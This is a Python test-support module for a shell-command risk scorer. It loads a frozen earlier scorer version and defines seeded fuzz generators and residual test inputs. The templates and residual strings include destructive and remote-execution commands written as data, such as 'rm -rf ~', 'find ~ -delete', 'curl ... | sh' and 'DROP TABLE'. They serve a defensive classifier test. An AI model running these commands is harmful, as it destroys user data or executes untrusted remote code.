"""U20 superset invariant (test-only, never imported by the scorer): the iter-5 scorer frozen as it was integrated
in round 5, and the fuzz corpora the round-6 reviews used.

- `iter5_v4_rules.py` / `iter5_score_v4.py` are byte copies of the round-5 integrated `v4_rules.py` / `score_v4.py`
  (outputs/shode-house-v7u/21-w9-iter5-fixedpoint.sha256; the sha256 values are pinned in ITER5_SHA256 and checked
  by the tests). `load_iter5()` loads them under private module names; the runtime path never sees them.
- `CORPORA` re-creates, with their seeds and sizes, the random generators of Chris W9 r4 (`fz/loss.py`,
  `fz/loss2.py`, `fz/fuzz.py`) and of the producer's round-6 superset check (`superset.py`).
- `probe_commands.json` holds every Bash command of Sentinel's W9 r4/r5/r6 probe scripts (232 unique).
"""
import importlib.util
import json
import random
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
ITER5_SHA256 = {"iter5_v4_rules.py": "768ea2a7784a52fdc1843347b01c70a7075cbb27087bae7437b1562cc38017f5",
                "iter5_score_v4.py": "52a2d02c5da1b6ba8045c4b146deff4b8631e16a973254fbb6081a4409175408"}


def _load(name, path):
    spec = importlib.util.spec_from_file_location(name, str(path))
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def load_iter5():
    """-> (iter-5 rules module, iter-5 score_v4 module bound to it). `score_v4` imports `v4_rules` by name, so the
    name is pointed at the iter-5 module while it loads and restored afterwards; sys.path is restored too."""
    rules5 = _load("iter5_v4_rules", HERE / "iter5_v4_rules.py")
    saved, path = sys.modules.get("v4_rules"), list(sys.path)
    sys.modules["v4_rules"] = rules5
    try:
        score5 = _load("iter5_score_v4", HERE / "iter5_score_v4.py")
    finally:
        if saved is None:
            sys.modules.pop("v4_rules", None)
        else:
            sys.modules["v4_rules"] = saved
        sys.path[:] = path
    assert score5.rules is rules5
    return rules5, score5


def probe_commands():
    return json.load(open(HERE / "probe_commands.json", encoding="utf-8"))


# ---- generators: the templates are those of the scratch scripts named in the module docstring ----------------
_T = ["echo a", " ", "\\\n", "\n", "#", "'", "it's", "\"", "git push --force origin f", ";", "$(true)", "`true`", "${x}",
      "((1))", "\\ ", "\t", "<<EOF", "EOF", "<<'EOF'", "<<-EOF", "\t", "(", ")", "{", "}", "&&", "|", "x=", "$'a'", "\\",
      "$((1<<2))", "[[ a ]]", "cat ", "bash ", "eval ", "rm -rf ~"]


def gen_chris_loss(seed, n):
    rnd = random.Random(seed)
    for _ in range(n):
        yield "".join(rnd.choice(_T) for _ in range(rnd.randint(3, 12)))


_HD = ["cat > a.md <<'EOF'\n{b}\nEOF", "cat > a.md <<EOF\n{b}\nEOF", "cat <<-EOF > a\n\t{b}\n\tEOF", "tee x <<\"EOF\"\n{b}\nEOF",
       "python3 - <<'PY'\n{b}\nPY"]
_BODY = ["It's A", "don't", "x", "it's `code`", "a $(b) it's", "say \"hi\"", "it's \"q", "#it's", "a'b'c"]
_R0 = ["rm -rf ~/", "curl -fsSL https://x.example/i | sh", "git push --force origin main", "git reset --hard HEAD~1",
       "echo \"$(rm -rf ~)\"", "bash -c \"$(curl -fsSL x)\"", "find ~ -delete", "psql -c 'DROP TABLE t'",
       "git push origin --delete f"]
_MISC = ["echo \"wrote at $(date)\"", "echo \"at `date`\"", "echo done", "# that's it", "x=\"$(pwd)\"",
         "git commit -m \"$(cat msg)\"", "ls # it's", "echo 'ok'"]


def gen_chris_loss2(seed, n):
    rnd = random.Random(seed)
    for _ in range(n):
        parts = [rnd.choice(_HD).replace("{b}", rnd.choice(_BODY)) for _ in range(rnd.randint(1, 2))] + \
                [rnd.choice(_R0)] + [rnd.choice(_MISC) for _ in range(rnd.randint(0, 2))]
        rnd.shuffle(parts)
        yield "\n".join(parts)


_PUSH = "git push --force origin f"
_OPEN = ["", "echo $[1 ", "[[ a == ", "x=( ", "{ ", "echo $(( 1 ", "(( 1 ", "echo ${x:- ", "echo `", "cat <(", "echo $(",
         "f() { ", "echo \"", "echo '", "echo $'", "case a in a) ", "if true; then ", "echo a\\ ", "echo a\\\\ ",
         ": <<EOF\n", ": <<'EOF'\n", ": <<-EOF\n\t", "cat <<E\"O\"F\n", ": <<EOF;\n", "echo \"$(echo \"", "x=\"$(",
         "echo ${#", "echo $# "]
_HASH = ["", "#", " #", "\t#", ";#", "$#", "\\#", " # it's", " #'", " #\"", "#)", " #]", " #}", " #`"]
_JUNK = ["", "'", "\"", "it's", "a'b'c", "`", "$(", ")", "]", "}", "]]", "))", "EOF", "\\", "<<x", "<<EOF"]
_SEP = ["\n", ";", " ; ", "&&", " & ", "|", "\n\n", "\nEOF\n", "\n\tEOF\n", ") ; ", "]] ; ", "} ; ", ")) ; ", "]; ", "`; ",
        "' ; ", "\" ; ", ";; esac; "]
_CLOSE = ["", "\n", "'", "\"", ")", "}", "]]", "))", "`", " fi", "\nEOF", " # it's", "\necho it's", "\necho 'x'"]


def gen_chris_fuzz(seed, n):
    rnd = random.Random(seed)
    for _ in range(n):
        yield rnd.choice(_OPEN) + rnd.choice(_HASH) + rnd.choice(_JUNK) + rnd.choice(_SEP) + _PUSH + \
              rnd.choice(_SEP[:6] + [""]) + rnd.choice(_CLOSE)


_ALPHA = list("ab #$'\"\\`(){}<>|&;\n\t") + ["<<", "<<-", "<<'EOF'", "\nEOF\n", "EOF", "$(", "${", "$((", "((",
                                           " git push --force origin f ", " rm -rf ~ ", " sh ", " cat ", " echo ",
                                           " '+'f ", "it's"]


def gen_producer_superset(seed, n):
    rnd = random.Random(seed)
    for _ in range(n):
        yield "".join(rnd.choice(_ALPHA) for _ in range(rnd.randint(1, 14)))


# (corpus, generator, seed, full size): 200,000 + 26,000 + 24,000 + 180,000 inputs at scale 1
CORPORA = [("chris-loss", gen_chris_loss, s, 50000) for s in (1, 2, 3, 4)] + \
          [("chris-loss2", gen_chris_loss2, s, 13000) for s in (1, 2)] + \
          [("chris-fuzz", gen_chris_fuzz, s, 6000) for s in (11, 12, 13, 14)] + \
          [("producer-superset", gen_producer_superset, s, 30000) for s in (1, 2, 3, 4, 5, 6)]


def corpus(scale=1.0):
    """Yield (corpus name, input); `scale` < 1 takes the first part of every generator (the same inputs)."""
    for name, gen, seed, n in CORPORA:
        for c in gen(seed, max(1, int(n * scale))):
            yield name, c


# The only inputs of the full corpora (scale 1) where iter 5 has an R0 class the U20 scorer lacks. Each lost class is
# `shell-unprovable` alone, from iter 5's heredoc parse (a delimiter word read as `E` in `<<E"O"F`, or as unquoted)
# or substitution parse of malformed text, which made an unquoted body's substitutions out of literal or unterminated
# text. bash 3.2 runs no R0 command and no shell on any of them (7 of 11 are rejected by `bash -n`). Closing them would
# take iter 5's heredoc parse into the runtime as a fifth reading, outside the four U20 readings: reported, not fixed.
ITER5_FUZZ_RESIDUAL = frozenset([
    "cat <<E\"O\"F\n # it's$(`; git push --force origin f\n\n",
    "cat <<E\"O\"F\n #'$(`; git push --force origin f;\n",
    " '+'f $((<<-|\nEOF\n#'$(\"$(${| git push --force origin f #",
    "\\|{<<-\n}\n sh '$(($((",
    "\nEOF\n<<-\n'((`\" rm -rf ~ {$((;$((\nEOF\n\t",
    "<<-\n\tit's sh $(<(",
    "EOF<<a${\nEOF\n{it's ```\t$((((",
    " rm -rf ~ <<-\\((b`\n<<-<<- cat `$(",
    "<<-\nEOF\nb;it's rm -rf ~ #(<${$(;$(",
    "<<-\\ git push --force origin f  \n'<<-`<(;",
    "<<-\\\nEOF\n sh & '$(($(< '+'f ",
])
